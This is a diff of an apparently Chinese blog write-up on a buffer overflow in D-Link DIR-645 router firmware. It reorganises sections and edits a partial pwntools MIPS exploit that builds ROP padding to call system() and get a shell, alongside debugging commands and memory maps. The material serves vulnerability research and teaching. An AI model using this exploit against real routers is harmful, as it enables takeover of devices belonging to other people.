@@ -190,7 +190,13 @@ FUN_004009f0(uVar7,auStack832);</code></pre>
 <p>这里的第一个uVar7是命令-a 的参数：生成登录hash的密码文件。这可以是我们输入的文件名，但是需要里面有内容，这样open不会报错。根据<code>post_login.xml</code>可知真实环境中应该是/var/run/password。手上没有真实机器所以就随便创建一个文件。</p>
 <p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200606112103650.png" alt=""></p>
 <p>因为真实环境中我们能控制的只有/var/run/hash。所以溢出点是调用FUN_004009f0(“/var/run/hash”,&amp;local_128)。</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="劫持PC，确定偏移"><a href="#劫持PC，确定偏移" class="headerlink" title="劫持PC，确定偏移"></a>劫持PC，确定偏移</h3><p>利用patternLocOffset.py生成context文件，包含特定格式的2000个字符串。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>整个漏洞利用过程是</p>
+<ul>
+<li>劫持PC，通过调试确定缓冲区大小，定位并确定控制偏移</li>
+<li>确定攻击路径，构造ROP链</li>
+<li>编写exp,getshell</li>
+</ul>
+<h3 id="劫持PC，确定偏移"><a href="#劫持PC，确定偏移" class="headerlink" title="劫持PC，确定偏移"></a>劫持PC，确定偏移</h3><p>利用patternLocOffset.py生成context文件，包含特定格式的2000个字符串。</p>
 <p><code>python patternLocOffset.py -c -l 2000 -f context</code></p>
 <p>测试脚本run.sh，因为解压的固件中没有/var/run文件夹所以需要手工创建，print函数默认在每行结尾加上换行，利用tr -d ‘\n’删除换行。经过尝试从context中读取400个字节不会报错。</p>
 <pre class=" language-sh"><code class="language-sh">#!/bin/bash
@@ -222,26 +228,26 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 ......
 0x7f738000 0x7f739000 rwxp     1000 0      /root/桌面/IoT/D-Link/DIR645/dir645-v103/_dir645_FW_103.bin.extracted/squashfs-root/lib/libuClibc-0.9.30.1.so
 0x7f739000 0x7f796000 r-xp    5d000 1000   /root/桌面/IoT/D-Link/DIR645/dir645-v103/_dir645_FW_103.bin.extracted/squashfs-root/lib/libuClibc-0.9.30.1.so</code></pre>
-<p>在main()函数返回时能覆盖fp,s0-s7,ra寄存器，所以接下来构造rop过程跟DIR815也是一样的。</p>
+<p>在main()函数返回时能覆盖fp,s0-s7,ra寄存器，所以接下来构造rop过程跟DIR815也是一样的。具体可以参考<a href="https://www.anquanke.com/post/id/206626#h3-7" target="_blank" rel="noopener">之前的文章</a>。</p>
 <p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200606235811264.png" alt=""></p>
-<h4 id="通过system函数getshell"><a href="#通过system函数getshell" class="headerlink" title="通过system函数getshell"></a>通过system函数getshell</h4><p>构造的exp如下：</p>
+<h4 id="通过system函数getshell"><a href="#通过system函数getshell" class="headerlink" title="通过system函数getshell"></a>通过system函数getshell</h4><p>整个流程如下，</p>
+<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200531102945201.png" alt=""></p>
+<p>构造的exp如下：</p>
 <pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python2</span>
 <span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">"little"</span>
 context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"mips"</span>
 base_addr <span class="token operator">=</span> <span class="token number">0x7f738000</span>
 system_addr_1 <span class="token operator">=</span> <span class="token number">0x53200</span><span class="token operator">-</span><span class="token number">1</span>
-gadget1 <span class="token operator">=</span> <span class="token number">0x45988</span><span class="token comment" spellcheck="true">#0x158C8</span>
+gadget1 <span class="token operator">=</span> <span class="token number">0x45988</span>
 gadget2 <span class="token operator">=</span> <span class="token number">0x159cc</span>
-padding <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">292</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#0x3cd</span>
+padding <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">292</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">9</span><span class="token punctuation">)</span> 
 padding <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr <span class="token operator">+</span> system_addr_1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s0</span>
 padding <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr <span class="token operator">+</span> gadget2<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s1</span>
-<span class="token comment" spellcheck="true">#padding += 'A' * 4                        # s1</span>
 padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s2</span>
 padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s3</span>
 padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s4</span>
 padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s5</span>
-<span class="token comment" spellcheck="true">#padding += p32(base_addr + gadget2)          # s5</span>
 padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s6</span>
 padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s7</span>
 padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># fp</span>
@@ -340,13 +346,7 @@ rm -f ./qemu</code></pre>
 <p>再是0x40B5E4处strncpy函数，</p>
 <p>strncpy(栈上地址0x76FFE798，password=’之后的内容，0x4B0)，</p>
 <p>函数是从0x76FFF07c开始覆盖，如果覆盖到存放返回值ra的栈地址0x76FFF07c，需要覆盖0x76FFF07c-0x76FFE798=0x8e4=2276字节的缓冲区，而之前2000个’A‘就提前报错了，所以0x40B5E4处strncpy()肯定不是漏洞触发点。这样就确定了read()函数是真正的漏洞触发函数。</p>
-<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>整个漏洞利用过程是</p>
-<ul>
-<li>劫持PC，通过调试确定缓冲区大小，定位并确定控制偏移</li>
-<li>确定攻击路径，构造ROP链</li>
-<li>编写exp,getshell</li>
-</ul>
-<h3 id="劫持PC，确定偏移-1"><a href="#劫持PC，确定偏移-1" class="headerlink" title="劫持PC，确定偏移"></a>劫持PC，确定偏移</h3><p>利用patternLocOffset.py生成context文件，包含特定格式的2000个字符串。</p>
+<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="劫持PC，确定偏移-1"><a href="#劫持PC，确定偏移-1" class="headerlink" title="劫持PC，确定偏移"></a>劫持PC，确定偏移</h3><p>利用patternLocOffset.py生成context文件，包含特定格式的2000个字符串。</p>
 <p><code>python patternLocOffset.py -c -l 2000 -f context</code></p>
 <p>执行命令：</p>
 <pre class=" language-sh"><code class="language-sh">sudo ./run.sh `python -c "print 'id=password='+open('context','r').read(1200)"`</code></pre>
@@ -369,11 +369,9 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
   0x433000   0x435000 rw-p     2000 23000  /htdocs/web/authentication.cgi
 0x76738000 0x76739000 rwxp     1000 0      645/_dir645_FW_103.bin.extracted/squashfs-root/lib/libuClibc-0.9.30.1.so
 0x76739000 0x76796000 r-xp    5d000 1000   645/_dir645_FW_103.bin.extracted/squashfs-root/lib/libuClibc-0.9.30.1.so</code></pre>
-<p>而且在authenticationcgi_main()函数返回时也能覆盖fp,s0-s7,ra寄存器，所以接下来构造rop过程跟DIR815也是一样。具体可以参考<a href="https://www.anquanke.com/post/id/206626#h3-7" target="_blank" rel="noopener">文章</a>。</p>
+<p>而且在authenticationcgi_main()函数返回时也能覆盖fp,s0-s7,ra寄存器，所以接下来构造rop过程跟DIR815也是一样。</p>
 <p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200531102820083.png" alt=""></p>
-<h4 id="通过system函数getshell-1"><a href="#通过system函数getshell-1" class="headerlink" title="通过system函数getshell"></a>通过system函数getshell</h4><p>整个流程图如下，</p>
-<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200531102945201.png" alt=""></p>
-<p>构造的exp如下：</p>
+<h4 id="通过system函数getshell-1"><a href="#通过system函数getshell-1" class="headerlink" title="通过system函数getshell"></a>通过system函数getshell</h4><p>构造的exp如下：</p>
 <pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
 <span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">"little"</span>
